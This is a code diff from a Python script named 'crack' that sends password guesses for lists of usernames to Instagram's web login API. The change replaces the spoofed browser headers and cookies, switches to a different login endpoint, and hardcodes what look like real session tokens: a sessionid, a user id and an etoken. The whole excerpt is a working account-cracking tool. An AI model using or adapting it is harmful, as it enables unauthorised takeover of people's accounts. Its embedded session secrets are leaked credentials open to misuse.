@@ -126,48 +126,51 @@ def crack(uid, pww, total_idz):
             enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
             response = session.get('https://www.instagram.com/accounts/login/')
             csrftoken = response.cookies.get('csrftoken')
-            cookies ={
-                'csrftoken': csrftoken,
-                'mid': 'ZsCYoAALAAGlcbYkVN23DYxQwevD',
-                'ig_did': 'E68CEB20-E5E7-4BF3-BE61-C5EF4084D93B',
-                'ig_nrcb': '1',
-                'datr': 'npjAZqX5wY3c_CtTDAvR0Ls3',
-                'ps_l': '1',
-                'ps_n': '1',
-                'wd': '885x773',}
-            data = {
-                "enc_password": enc_password,
-                'optIntoOneTap': 'false',
-                'queryParams': '{"hl":"en"}',
-                'trustedDeviceRecords': '{}',
-                'username': uid,}
+            cookies = {
+            'datr': 'lIB4aBrfVthN1_tPJkP4FZik',
+            'ig_did': '9EB0467C-DAD0-42E2-B429-130B1EA59B96',
+            'mid': 'aHiAlAALAAGaod0oZfM950AkBwnm',
+            'ig_nrcb': '1',
+            'csrftoken': csrftoken,
+            'ds_user_id': '75581063753',
+            'ps_l': '1',
+            'ps_n': '1',
+            'sessionid': '75581063753%3A4vhxbQFvUWAHDO%3A28%3AAYjRfm0CZXc7upp4wC0nnzmVuettGe891z5hjzgvAg',
+            'rur': '"CCO\\05475581063753\\0541796905680:01fe9997eaf0060e52ab9ca3cf5bd174e0e82a544f19c09cfe01a101725ac255ccc182a9"',
+            'wd': '1045x776',}
+            data ={
+            'enc_password': enc_password,
+            'etoken': 'AbkPJww_lpsLjlOOYAZxBzmhTqjFG2VDTVoAoxFleQNb8QhjFDK_8XrxakUQ1qKSXM3YRoL0ok0LN6BNKeMUfhSm_CRPfe-FXKnz5mUuuf7Gi8fYtRY',
+            'username': uid,
+            'jazoest': '22713',}
             headers = {
-                'authority': 'www.instagram.com',
-                'accept': '*/*',
-                'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5',
-                'content-type': 'application/x-www-form-urlencoded',
-                # 'cookie': 'csrftoken=4M2PbXXQYNEmDdxrQg01NL; mid=ZsCYoAALAAGlcbYkVN23DYxQwevD; ig_did=E68CEB20-E5E7-4BF3-BE61-C5EF4084D93B; ig_nrcb=1; datr=npjAZqX5wY3c_CtTDAvR0Ls3; ps_l=1; ps_n=1; wd=885x773',
-                'origin': 'https://www.instagram.com',
-                'priority': 'u=1, i',
-                'referer': 'https://www.instagram.com/accounts/login/?hl=en',
-                'sec-ch-prefers-color-scheme': 'dark',
-                'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
-                'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-model': '""',
-                'sec-ch-ua-platform': '"Windows"',
-                'sec-ch-ua-platform-version': '"10.0.0"',
-                'sec-fetch-dest': 'empty',
-                'sec-fetch-mode': 'cors',
-                'sec-fetch-site': 'same-origin',
-                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
-                'x-asbd-id': '129477',
-                'x-csrftoken': csrftoken,
-                'x-ig-app-id': '936619743392459',
-                'x-ig-www-claim': '0',
-                'x-instagram-ajax': '1015820104',
-                'x-requested-with': 'XMLHttpRequest',}
-            login_url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'no-cache',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://www.instagram.com',
+            'pragma': 'no-cache',
+            'priority': 'u=1, i',
+            'referer': 'https://www.instagram.com/fxcal/auth/login/?app_id=2220391788200892&etoken=AbkPJww_lpsLjlOOYAZxBzmhTqjFG2VDTVoAoxFleQNb8QhjFDK_8XrxakUQ1qKSXM3YRoL0ok0LN6BNKeMUfhSm_CRPfe-FXKnz5mUuuf7Gi8fYtRY&next=https%3A%2F%2Faccountscenter.facebook.com%2Fadd%2F%3Fauth_flow%3Dig_linking%26background_page%3D%252F&flow=igcalcomettest&entry_point=fb_web_settings&initiator_fbid=100052156371595&is_initiator_feta=0&fbclid=IwY2xjawOmRplleHRuA2FlbQIxMABicmlkETFuU2VSZmNSTkl0Q3U3bWxTc3J0YwZhcHBfaWQQMjIyMDM5MTc4ODIwMDg5MgABHnmIuoDeyzCXp028q2Uwjk_wEW5OKyMwX0kOZSO3V5nKZe-AVoJPpHEC1eeo_aem_LFd4TGpGoC6WXASVfZ7xsg',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Microsoft Edge";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
+            'sec-ch-ua-full-version-list': '"Microsoft Edge";v="143.0.3650.66", "Chromium";v="143.0.7499.41", "Not A(Brand";v="24.0.0.0"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-platform-version': '"10.0.0"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36 Edg/143.0.0.0',
+            'x-asbd-id': '359341',
+            'x-csrftoken': csrftoken,
+            'x-ig-app-id': '936619743392459',
+            'x-ig-www-claim': 'hmac.AR2G1riIZ4mLPBSXPUUqgmOnbgrpY99QA_ZbByNjdANG35Sz',
+            'x-instagram-ajax': '1030879028',
+            'x-requested-with': 'XMLHttpRequest',
+            'x-web-session-id': 'ipf4ju:10coml:tfm21r',}
+            login_url = 'https://www.instagram.com/api/v1/web/fxcal/auth/login/ajax/'
             response = requests.post(login_url, cookies=cookies, headers=headers, data=data)
             session_cookies = response.cookies.get_dict()
             if response.status_code == 200:
